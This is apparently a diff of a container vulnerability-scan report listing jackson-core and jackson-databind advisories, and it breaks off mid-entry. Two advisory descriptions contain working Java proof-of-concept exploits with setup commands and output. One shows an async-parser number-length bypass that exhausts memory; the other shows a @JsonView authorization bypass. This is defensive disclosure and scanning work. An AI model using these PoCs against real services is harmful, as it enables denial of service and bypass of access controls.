+      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1
+      UID: e7f3a221af06f63e
+    InstalledVersion: 2.21.1
+    FixedVersion: 2.18.8, 2.21.4, 2.22.1
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    SeveritySource: ghsa
+    PrimaryURL: https://github.com/advisories/GHSA-r7wm-3cxj-wff9
+    DataSource:
+      ID: ghsa
+      Name: GitHub Security Advisory Maven
+      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
+    Fingerprint: sha256:8eb56afce8819c673bf460077c7a3fb66a3c2de2067374191337b7361383d2df
+    Title: 'jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)'
+    Description: |-
+      ## Summary
+
+      The fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: "ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller".
+
+      As a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).
+
+      This is the same vulnerability class, same advisory wording ("Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.
+
+      ## Affected versions
+
+      Verified on the patched releases:
+      - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
+      - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
+
+      Structurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.
+
+      ## Affected code
+
+      [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.
+
+      ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
+
+      ```java
+      if (outPtr >= outBuf.length) {
+          // NOTE: must expand to ensure contents all in a single buffer (to keep
+          // other parts of parsing simpler)
+          outBuf = _textBuffer.expandCurrentSegment();
+      }
+      outBuf[outPtr++] = (char) ch;
+      if (++_inputPtr >= _inputEnd) {
+          _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+          _textBuffer.setCurrentLength(outPtr);
+          return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)
+      }
+      ```
+
+      ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
+
+      ```java
+      protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
+          int negMod = _numberNegative ? -1 : 0;
+
+          while (true) {
+              if (_inputPtr >= _inputEnd) {
+                  _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+                  _textBuffer.setCurrentLength(outPtr);
+                  return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)
+              }
+              int ch = getByteFromBuffer(_inputPtr) & 0xFF;
+              if (ch < INT_0) {
+                  if (ch == INT_PERIOD) {
+                      _setIntLength(outPtr+negMod);   // <-- validated here
+                      ++_inputPtr;
+                      return _startFloat(outBuf, outPtr, ch);
+                  }
+                  break;
+              }
+              if (ch > INT_9) {
+                  if ((ch | 0x20) == INT_e) {
+                      _setIntLength(outPtr+negMod);   // <-- validated here
+                      ++_inputPtr;
+                      return _startFloat(outBuf, outPtr, ch);
+                  }
+                  break;
+              }
+              ++_inputPtr;
+              if (outPtr >= outBuf.length) {
+                  outBuf = _textBuffer.expandCurrentSegment();
+              }
+              outBuf[outPtr++] = (char) ch;
+          }
+          _setIntLength(outPtr+negMod);            // <-- validated here
+          _textBuffer.setCurrentLength(outPtr);
+          return _valueComplete(JsonToken.VALUE_NUMBER_INT);
+      }
+      ```
+
+      The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to the caller without validating the accumulator length.
+
+      ### Compare with the fraction path that is correct
+
+      `_finishFloatFraction` lines 1827-1838:
+
+      ```java
+      while (loop) {
+          if (ch >= INT_0 && ch <= INT_9) {
+              ++fractLen;
+              if (outPtr >= outBuf.length) {
+                  outBuf = _textBuffer.expandCurrentSegment();
+              }
+              outBuf[outPtr++] = (char) ch;
+              if (_inputPtr >= _inputEnd) {
+                  _textBuffer.setCurrentLength(outPtr);
+                  _setFractLength(fractLen);          // <-- VALIDATED
+                  return JsonToken.NOT_AVAILABLE;
+              }
+              ch = getNextSignedByteFromBuffer();
+          }
+          ...
+      }
+      ```
+
+      ## Impact
+
+      Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.
+
+      The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.
+
+      CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.
+
+      ## Proof of concept
+
+      Standalone PoC, no Maven required:
+
+      ```
+      mkdir poc && cd poc
+      curl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar
+      cat > PoC.java <<'EOF'
+      import com.fasterxml.jackson.core.*;
+      import com.fasterxml.jackson.core.async.ByteArrayFeeder;
+
+      public class PoC {
+          public static void main(String[] args) throws Exception {
+              StreamReadConstraints strict = StreamReadConstraints.builder()
+                      .maxNumberLength(1000)
+                      .build();
+              JsonFactory f = new JsonFactoryBuilder()
+                      .streamReadConstraints(strict)
+                      .build();
+
+              // Sanity: synchronous parser rejects 5000-digit int.
+              try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) + "}")) {
+                  while (p.nextToken() != null) { /* drive */ }
+                  System.out.println("[-] BUG ABSENT: sync parser accepted");
+                  return;
+              } catch (Exception e) {
+                  System.out.println("[+] sync parser rejected 5000-digit int: " + e.getClass().getSimpleName());
+              }
+
+              // Bug: async parser, chunked, no terminator.
+              JsonParser ap = f.createNonBlockingByteArrayParser();
+              ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
+
+              byte[] preamble = "{\"v\":".getBytes("UTF-8");
+              feeder.feedInput(preamble, 0, preamble.length);
+              while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }
+
+              byte[] digits = new byte[16 * 1024];
+              for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));
+
+              for (int c = 0; c < 600; c++) {
+                  feeder.feedInput(digits, 0, digits.length);
+                  JsonToken t = ap.nextToken();
+                  if (t != JsonToken.NOT_AVAILABLE) {
+                      System.out.println("[-] unexpected token: " + t);
+                      return;
+                  }
+              }
+              System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000");
+
+              // Closing the number now finally triggers the validator.
+              feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
+              feeder.endOfInput();
+              try {
+                  while (ap.nextToken() != null) { /* drive */ }
+              } catch (Exception e) {
+                  System.out.println("[*] late rejection on close: " + e.getMessage().split("\n")[0]);
+              }
+              ap.close();
+          }
+      }
+      EOF
+      javac -cp jackson-core-2.18.6.jar PoC.java
+      java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
+      ```
+
+      Observed output against `jackson-core-2.18.6`:
+
+      ```
+      [+] sync parser rejected 5000-digit int: StreamConstraintsException
+      [+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000
+      [*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
+      ```
+
+      Observed output against `jackson-core-2.21.1`: identical.
+
+      The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.
+
+      ## End-to-end reproduction through real HTTP
+
+      Supplements the standalone PoC with a running Spring Boot WebFlux server,
+      driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
+      streaming-decode path that production reactive endpoints use.
+
+      Setup:
+      - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)
+      - jackson-databind 2.17.2, jackson-core overridden:
+        - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)
+        - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
+      - JVM: OpenJDK 17.0.18
+      - Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`
+
+      Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
+      `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one
+      HTTP chunk per `feedInput` (the same pattern used for any
+      `@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
+      HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
+      each (50,000 digits total) at 20ms intervals, then writes the closing `}`.
+
+      VULN — jackson-core 2.18.7:
+      ```
+      [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting
+      [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
+      HTTP/1.1 200 OK
+      ERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
+             Number value length (50000) exceeds the maximum allowed (1000, ...)
+      ```
+      Server-side controller trace (250 DataBuffer arrivals elided):
+      ```
+      [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
+      [ctrl] DataBuffer arrived size=200 ms=42
+      ...
+      [ctrl] DataBuffer arrived size=199 ms=5993
+      [ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
+      [ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
+      ```
+      Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
+      `maxNumberLength=1000` declared. The validator never fires during streaming;
+      it only fires at value-completion when the closing `}` arrives.
+
+      PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
+      ```
+      [PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe
+      [PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream
+      ```
+      Server-side controller trace:
+      ```
+      [ctrl] DataBuffer arrived size=6   ms=129
+      [ctrl] DataBuffer arrived size=200 ms=142
+      [ctrl] DataBuffer arrived size=200 ms=142
+      [ctrl] DataBuffer arrived size=200 ms=145
+      [ctrl] DataBuffer arrived size=200 ms=146
+      [ctrl] DataBuffer arrived size=200 ms=147
+      [ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)
+      ```
+      Patched server raises `StreamConstraintsException` at 155ms after only 5
+      DataBuffers, exactly when the accumulated digit count crosses
+      `maxNumberLength=1000`. The connection is reset mid-stream rather than the
+      parser silently consuming the rest of the attacker's payload.
+
+      Side-by-side:
+
+      | Build | Chunks accepted before exception | Digits buffered | Time to detection |
+      |---|---|---|---|
+      | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |
+      | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |
+
+      Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
+      distinguish the two builds because Spring's `decodeToMono` joins all
+      DataBuffers into one before parsing. The exploitable shape is the
+      streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
+      WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
+      which is also what `Jackson2Tokenizer` uses for any streaming JSON
+      deserialization in WebFlux and Quarkus reactive REST.
+
+      ## Suggested fix
+
+      Mirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:
+
+      ```diff
+           protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
+               int negMod = _numberNegative ? -1 : 0;
+
+               while (true) {
+                   if (_inputPtr >= _inputEnd) {
+                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+                       _textBuffer.setCurrentLength(outPtr);
+      +                _streamReadConstraints.validateIntegerLength(outPtr + negMod);
+                       return _updateTokenToNA();
+                   }
+      ```
+
+      Note: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.
+
+      Apply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).
+
+      Alternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.
+
+      ## Credit
+
+      Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.
+    Severity: HIGH
+    VendorSeverity:
+      ghsa: 3
+    CVSS:
+      ghsa:
+        V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
+        V40Score: 8.7
+    References:
+    - https://github.com/FasterXML/jackson-core
+    - https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd
+    - https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641
+    - https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8
+    - https://github.com/FasterXML/jackson-core/pull/1611
+    - https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9
+    PublishedDate: '2026-07-21T21:58:53Z'
+    LastModifiedDate: '2026-07-21T21:58:53Z'
   - VulnerabilityID: CVE-2026-54512
     VendorIDs:
     - GHSA-j3rv-43j4-c7qm
@@ -13270,7 +14024,10 @@
     - CWE-184
     - CWE-502
     VendorSeverity:
+      alma: 3
+      amazon: 3
       ghsa: 3
+      oracle-oval: 3
       redhat: 3
     CVSS:
       ghsa:
@@ -13280,11 +14037,17 @@
         V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
         V3Score: 8.1
     References:
+    - https://access.redhat.com/errata/RHSA-2026:40895
     - https://access.redhat.com/security/cve/CVE-2026-54512
+    - https://bugzilla.redhat.com/2492010
+    - https://bugzilla.redhat.com/2492015
+    - https://errata.almalinux.org/9/ALSA-2026-40895.html
     - https://github.com/FasterXML/jackson-databind
     - https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5
     - https://github.com/FasterXML/jackson-databind/issues/5988
     - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm
+    - https://linux.oracle.com/cve/CVE-2026-54512.html
+    - https://linux.oracle.com/errata/ELSA-2026-40895.html
     - https://nvd.nist.gov/vuln/detail/CVE-2026-54512
     - https://www.cve.org/CVERecord?id=CVE-2026-54512
     PublishedDate: '2026-06-23T21:17:02.203Z'
@@ -13316,7 +14079,10 @@
     CweIDs:
     - CWE-184
     VendorSeverity:
+      alma: 3
+      amazon: 3
       ghsa: 3
+      oracle-oval: 3
       redhat: 3
     CVSS:
       ghsa:
@@ -13328,8 +14094,13 @@
     References:
     - https://access.redhat.com/errata/RHSA-2026:36839
     - https://access.redhat.com/errata/RHSA-2026:40895
+    - https://access.redhat.com/errata/RHSA-2026:41951
+    - https://access.redhat.com/errata/RHSA-2026:43218
     - https://access.redhat.com/security/cve/CVE-2026-54513
+    - https://bugzilla.redhat.com/2492010
+    - https://bugzilla.redhat.com/2492015
     - https://bugzilla.redhat.com/show_bug.cgi?id=2492010
+    - https://errata.almalinux.org/9/ALSA-2026-40895.html
     - https://github.com/FasterXML/jackson-databind
     - https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5
     - https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e
@@ -13337,11 +14108,13 @@
     - https://github.com/FasterXML/jackson-databind/issues/5983
     - https://github.com/FasterXML/jackson-databind/pull/5984
     - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-rmj7-2vxq-3g9f
+    - https://linux.oracle.com/cve/CVE-2026-54513.html
+    - https://linux.oracle.com/errata/ELSA-2026-40895.html
     - https://nvd.nist.gov/vuln/detail/CVE-2026-54513
     - https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54513.json
     - https://www.cve.org/CVERecord?id=CVE-2026-54513
     PublishedDate: '2026-06-23T21:17:02.333Z'
-    LastModifiedDate: '2026-07-17T13:18:57.98Z'
+    LastModifiedDate: '2026-07-22T12:18:14.063Z'
   - VulnerabilityID: CVE-2026-54514
     VendorIDs:
     - GHSA-hgj6-7826-r7m5
@@ -13369,6 +14142,7 @@
     CweIDs:
     - CWE-918
     VendorSeverity:
+      amazon: 3
       ghsa: 2
       redhat: 2
     CVSS:
@@ -13415,6 +14189,7 @@
     CweIDs:
     - CWE-915
     VendorSeverity:
+      amazon: 3
       ghsa: 2
       redhat: 2
     CVSS:
@@ -13579,3 +14354,342 @@
     - https://www.cve.org/CVERecord?id=CVE-2026-54518
     PublishedDate: '2026-06-23T22:16:32.073Z'
     LastModifiedDate: '2026-06-27T20:49:30.977Z'
+  - VulnerabilityID: CVE-2026-59888
+    VendorIDs:
+    - GHSA-3pjw-73gf-8qr5
+    PkgName: com.fasterxml.jackson.core:jackson-databind
+    PkgPath: openaf/openaf.jar
+    PkgIdentifier:
+      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1
+      UID: 6bd66f14c6cb3d57
+    InstalledVersion: 2.21.1
+    FixedVersion: 2.18.8, 2.21.4
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    SeveritySource: ghsa
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59888
+    DataSource:
+      ID: ghsa
+      Name: GitHub Security Advisory Maven
+      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
+    Fingerprint: sha256:ad0c6456fda17f0d3c81a518563c725cdc66370615dc91a33b5279e87d39feac
+    Title: 'jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy'
+    Description: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-915
+    VendorSeverity:
+      ghsa: 2
+    CVSS:
+      ghsa:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+        V3Score: 6.5
+    References:
+    - https://github.com/FasterXML/jackson-databind
+    - https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4
+    - https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d
+    - https://github.com/FasterXML/jackson-databind/pull/5974
+    - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59888
+    PublishedDate: '2026-07-14T17:17:15.137Z'
+    LastModifiedDate: '2026-07-15T20:18:23.677Z'
+  - VulnerabilityID: CVE-2026-59889
+    VendorIDs:
+    - GHSA-5gvw-p9qm-jgwh
+    PkgName: com.fasterxml.jackson.core:jackson-databind
+    PkgPath: openaf/openaf.jar
+    PkgIdentifier:
+      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1
+      UID: 6bd66f14c6cb3d57
+    InstalledVersion: 2.21.1
+    FixedVersion: 2.21.5, 2.18.9, 2.22.1
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    SeveritySource: ghsa
+    PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-59889
+    DataSource:
+      ID: ghsa
+      Name: GitHub Security Advisory Maven
+      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
+    Fingerprint: sha256:a5aaf02e61d7a8244557e2820efb69bbd288d62addb002da72d477181cf25b71
+    Title: 'jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on deserialization'
+    Description: jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet() without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property annotated with both @JsonView and @JsonUnwrapped to be written from attacker JSON under a less-privileged active view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1.
+    Severity: MEDIUM
+    CweIDs:
+    - CWE-863
+    VendorSeverity:
+      ghsa: 2
+    CVSS:
+      ghsa:
+        V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+        V3Score: 6.5
+    References:
+    - https://github.com/FasterXML/jackson-databind
+    - https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb062429282f79f3f256f181ed2c7b
+    - https://github.com/FasterXML/jackson-databind/issues/6060
+    - https://github.com/FasterXML/jackson-databind/pull/6056
+    - https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5gvw-p9qm-jgwh
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-59889
+    PublishedDate: '2026-07-14T21:17:06.16Z'
+    LastModifiedDate: '2026-07-16T16:19:15.79Z'
+  - VulnerabilityID: GHSA-mhm7-754m-9p8w
+    PkgName: com.fasterxml.jackson.core:jackson-databind
+    PkgPath: openaf/openaf.jar
+    PkgIdentifier:
+      PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1
+      UID: 6bd66f14c6cb3d57
+    InstalledVersion: 2.21.1
+    FixedVersion: 2.18.9, 2.21.5
+    Status: fixed
+    Layer:
+      Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279a8305ba35c82bf9229f
+      DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7ea46f72dd8aa890c14b
+    SeveritySource: ghsa
+    PrimaryURL: https://github.com/advisories/GHSA-mhm7-754m-9p8w
+    DataSource:
+      ID: ghsa
+      Name: GitHub Security Advisory Maven
+      URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven
+    Fingerprint: sha256:48568cf0018829ced39614830b3d05d3412b55a4324b51d2e4ed067d7c5dd91d
+    Title: 'jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`'
+    Description: |-
+      ## Summary
+
+      In `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,
+        include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.
+
+        This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 ("Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer", commit 7dc7a17, 2026-05-22) but
+        **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.
+
+      ## Vulnerable Code Path
+
+      File: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`
+      Method: `deserializeUsingPropertyBasedWithExternalTypeId`
+
+      On 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:
+
+       ```java
+        if (creatorProp != null) {
+            // [databind#1381]: if useInput=FALSE, skip deserialization from input
+            if (creatorProp.isInjectionOnly()) { ... }
+            // NO visibleInView(activeView) CHECK HERE
+            if (!ext.handlePropertyValue(p, ctxt, propName, null)) {
+                if (buffer.assignParameter(creatorProp, ...)) { ... }
+            }
+            continue;
+        }
+      ```
+
+      On 3.1.4, the same branch contains the additional guard (commit 7dc7a17):
+
+       ```java
+         if (creatorProp != null) {
+            // [databind#5971]: must honor active view here too
+            if ((activeView != null) && !creatorProp.visibleInView(activeView)) {
+                p.skipChildren();
+                continue;
+            }
+            ...
+        }
+      ```
+
+      The 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005
+        with "got changes merged forward, looks like it's all covered now", but the forward-merge did not include the ExtTypeId creator branch.
+
+        Proof of Concept
+
+        Compiles and runs against jackson-databind 2.21.4:
+       
+      ```java
+        import com.fasterxml.jackson.annotation.*;
+        import com.fasterxml.jackson.databind.ObjectMapper;
+
+        public class JsonViewExternalTypeIdBypass {
+            public static class PublicView {}
+            public static class AdminView extends PublicView {}
+
+            public static abstract class Asset { public String name; }
+            public static class PublicAsset extends Asset {}
+            public static class AdminAsset extends Asset { public String secret; }
+
+            public static class Container {
+                @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                        include = JsonTypeInfo.As.EXTERNAL_PROPERTY,
+                        property = "kind")
+                @JsonSubTypes({
+                    @JsonSubTypes.Type(value = PublicAsset.class, name = "pub"),
+                    @JsonSubTypes.Type(value = AdminAsset.class,  name = "admin")
+                })
+                @JsonView(AdminView.class)
+                public Asset asset;
+
+                public String label;
+
+                @JsonCreator
+                public Container(
+                        @JsonProperty("label") String label,
+                        @JsonProperty("asset") @JsonView(AdminView.class) Asset asset) {
+                    this.label = label;
+                    this.asset = asset;
+                }
+            }
+
+            public static class Wrapper {
+                @JsonView(PublicView.class)
+                public Container data;
+            }
+
+            public static void main(String[] args) throws Exception {
+                // Admin-only "asset" should be blocked when reading with PublicView
+                String json = "{\"data\":{\"label\":\"hello\",\"kind\":\"admin\","
+                            + "\"asset\":{\"name\":\"foo\",\"secret\":\"LEAKED\"}}}";
+
+                ObjectMapper om = new ObjectMapper();
+                Wrapper r = om.readerWithView(PublicView.class)
+                        .forType(Wrapper.class)
+                        .readValue(json);
+
+                System.out.println(r.data);
+                // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}
+                // Expected (secure):  Container{label='hello', asset=null}
+                if (r.data.asset != null && r.data.asset instanceof AdminAsset) {
+                    System.out.println("[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView");
+                }
+            }
+        }
+      ```
+
+      A control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId
+        code path and not a misconfiguration.
+
+      ### Impact
+
